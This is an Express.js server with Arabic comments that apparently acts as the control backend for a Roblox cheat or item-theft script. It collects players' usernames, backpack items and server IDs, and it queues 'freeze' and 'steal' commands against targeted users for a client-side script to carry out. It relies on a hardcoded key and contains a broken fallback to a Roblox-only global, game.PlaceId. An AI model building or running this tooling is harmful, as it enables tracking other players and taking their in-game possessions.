const express = require('express');
const cors = require('cors');
const app = express();
app.use(cors());
app.use(express.json());

// قاعدة بيانات مؤقتة (بتنمسح إذا Render أعاد تشغيل)
let players = {};
let commands = []; // كل أمر له id, targetUserId, action

const API_KEY = "dih"; 

// حماية بسيطة
function checkAuth(req, res, next) {
  if (req.headers['x-api-key'] !== API_KEY) {
    return res.status(403).json({ error: 'ممنوع' });
  }
  next();
}

// استقبال بيانات اللاعب
app.post('/update', checkAuth, (req, res) => {
  const { userId, username, backpackItems, jobId, placeId } = req.body;
  if (!userId || !username || !jobId) {
    return res.status(400).json({ error: 'بيانات ناقصة' });
  }
  players[userId] = {
    userId,
    username,
    backpackItems: backpackItems || [],
    jobId,
    placeId: placeId || game.PlaceId, // ممكن ترسلها
    lastUpdate: Date.now()
  };
  res.json({ success: true });
});

// جلب كل اللاعبين
app.get('/players', checkAuth, (req, res) => {
  res.json(Object.values(players));
});

// إرسال أمر (تثبيت أو غيره)
app.post('/command', checkAuth, (req, res) => {
  const { targetUserId, action } = req.body; // action: "freeze", "unfreeze", "steal"
  if (!targetUserId || !action) {
    return res.status(400).json({ error: 'ناقص targetUserId أو action' });
  }
  const cmd = {
    id: Date.now() + Math.random(),
    targetUserId,
    action,
    timestamp: Date.now()
  };
  commands.push(cmd);
  res.json({ success: true, commandId: cmd.id });
});

// جلب الأوامر المعلقة للاعب معين (اللي شغال عنده سكربت المراقبة)
app.get('/commands/:userId', checkAuth, (req, res) => {
  const userId = req.params.userId;
  const myCommands = commands.filter(cmd => cmd.targetUserId === userId);
  // نرجعها ونمسحها
  commands = commands.filter(cmd => cmd.targetUserId !== userId);
  res.json(myCommands);
});

// حذف أمر معين (بعد التنفيذ)
app.delete('/command/:id', checkAuth, (req, res) => {
  const id = req.params.id;
  commands = commands.filter(cmd => cmd.id != id);
  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`API running on port ${PORT}`);
});
